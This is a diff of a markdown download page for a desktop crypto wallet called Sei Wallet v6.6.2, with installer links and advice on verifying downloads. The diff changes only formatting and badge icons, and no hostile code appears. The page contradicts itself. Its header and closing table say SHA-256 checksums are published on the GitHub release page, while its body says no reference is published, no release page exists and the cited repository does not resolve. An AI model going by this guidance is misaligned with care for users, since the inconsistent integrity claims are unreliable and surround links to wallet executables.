@@ -5,23 +5,27 @@
 <p align="center">Check the file you downloaded against the published SHA-256 before you run it.</p>
 
 <p align="center">
-  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
+  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
   <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
-  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
+  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
 </p>
+
+<div align="center">
 
 | Platform | Requirements | File |
 |:--|:--|:--|
-| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
-| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
-| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
+| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
+| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+
+</div>
 
 All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).
 
 > [!WARNING]
 > Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.
 
-Verification is three checks, in this order: you got the file from the operator's own domain, the file is a real build rather than an empty or HTML file, and your operating system recognises the publisher when you first run it. A published reference to compare against would be a fourth check, and it is the one you cannot do yet — none is published, so anyone quoting one to you is quoting themselves.
+Verification is three checks, in this order: you got the file from the operator's own domain, the file is a real build rather than an empty or HTML file, and your operating system recognises the publisher when you first run it. A published reference to compare against would be a fourth check, and it is the one you cannot do yet - none is published, so anyone quoting one to you is quoting themselves.
 
 That last sentence is the useful part. A reference only means something when it comes from the publisher through a channel separate from the download. An unpublished one is exactly the artefact a fake site supplies, which is why "here is what it should be, compare it" is a red flag rather than reassurance.
 
@@ -29,9 +33,9 @@ That last sentence is the useful part. A reference only means something when it 
 
 Three things are checkable without any help from the operator:
 
-- **Provenance** — you started from the operator's own domain, not a search result, an ad or a message.
-- **Plausibility of the artefact** — the download produced a file of a sensible size that runs, rather than a web page saved with an installer's name.
-- **Publisher identity at run time** — your operating system shows who signed the build, or tells you it is unsigned.
+- **Provenance** - you started from the operator's own domain, not a search result, an ad or a message.
+- **Plausibility of the artefact** - the download produced a file of a sensible size that runs, rather than a web page saved with an installer's name.
+- **Publisher identity at run time** - your operating system shows who signed the build, or tells you it is unsigned.
 
 One thing is not checkable: whether the bytes you received match the bytes the operator built. That requires a published value or a reproducible build, and neither is available. This is a gap in the evidence, not a verdict on the software.
 
@@ -45,7 +49,7 @@ HTTPS tells you the connection to that domain is encrypted. It does not tell you
 
 A download that finishes instantly is the tell. Two failure shapes matter:
 
-**A zero-byte file.** The transfer completed but nothing arrived. That is a broken artefact — a server or build problem, not evidence of malice — and running it is impossible because there is nothing to run. Delete it and try again later or from another platform build.
+**A zero-byte file.** The transfer completed but nothing arrived. That is a broken artefact - a server or build problem, not evidence of malice - and running it is impossible because there is nothing to run. Delete it and try again later or from another platform build.
 
 **A web page saved as an installer.** Some hijacked links return HTML with an installer's name. Your system may open it in a browser, or refuse it. If double-clicking opens a page rather than an installer dialog, you have the wrong artefact.
 
@@ -57,20 +61,20 @@ The operator states that Windows builds are code-signed and macOS builds are not
 
 What you can still do is read what your machine says. On Windows, the first run of a signed installer shows a publisher identity in the security dialog; an unsigned one shows an unknown publisher or a block. On macOS, Gatekeeper either opens the app or refuses it as coming from an unidentified developer.
 
-An unsigned warning is a fact about the file, not proof of tampering — plenty of legitimate software ships unsigned. But a build that claims signing and arrives unsigned is a mismatch worth stopping over.
+An unsigned warning is a fact about the file, not proof of tampering - plenty of legitimate software ships unsigned. But a build that claims signing and arrives unsigned is a mismatch worth stopping over.
 
 ## Check 4: the step that is not available
 
 To confirm integrity you need a reference published by the operator, obtained separately from the download, and a tool that computes the same thing locally. Neither end exists here: no release page, no published reference, and the repository the site cites does not resolve.
 
-So the honest status of this check is **NO DATA**. Not "there is no verification", and not "the download is fine" — simply that the comparison cannot be made today. If someone offers to perform it for you, they are asking for trust rather than providing evidence.
+So the honest status of this check is **NO DATA**. Not "there is no verification", and not "the download is fine" - simply that the comparison cannot be made today. If someone offers to perform it for you, they are asking for trust rather than providing evidence.
 
 ## What a bad download looks like
 
 - an installer whose size is implausibly small, or exactly zero;
 - a file that opens a browser page instead of an installer;
 - a publisher prompt naming an entity you did not expect;
-- a request for your seed phrase at any point during installation — installation never needs it;
+- a request for your seed phrase at any point during installation - installation never needs it;
 - a "support" agent who contacts you first, about anything;
 - a page that instructs you to disable antivirus or Gatekeeper.
 
@@ -92,7 +96,7 @@ Until then, the advice stands: provenance, artefact sense, publisher prompt, sma
 
 ## Related reading
 
-What the software is and who operates it: [an introduction to the product](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md). What safety can and cannot be asserted about it: [what safety can be asserted](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md). If you are adding Sei to an existing EVM wallet instead of installing anything: [the MetaMask route](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md). If the reason you are installing is staking: [how to stake SEI](https://github.com/sei-chain/sei-wallet-staking/blob/main/how-to-stake-your-first-coins.md).
+What the software is and who operates it: [an introduction to Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md). What safety can and cannot be asserted about it: [what safety can be asserted](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md). If you are adding Sei to an existing EVM wallet instead of installing anything: [the MetaMask route](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md). If the reason you are installing is staking: [how to stake SEI](https://github.com/sei-chain/sei-wallet-staking/blob/main/how-to-stake-your-first-coins.md).
 
 ## Frequently asked questions
 
@@ -110,11 +114,15 @@ What the software is and who operates it: [an introduction to the product](https
 
 ## Download Sei Wallet
 
+<div align="center">
+
 | Platform | Installer |
 |:--|:--|
-| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
-| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
-| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
+| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
+| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+
+</div>
 
 Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.
 
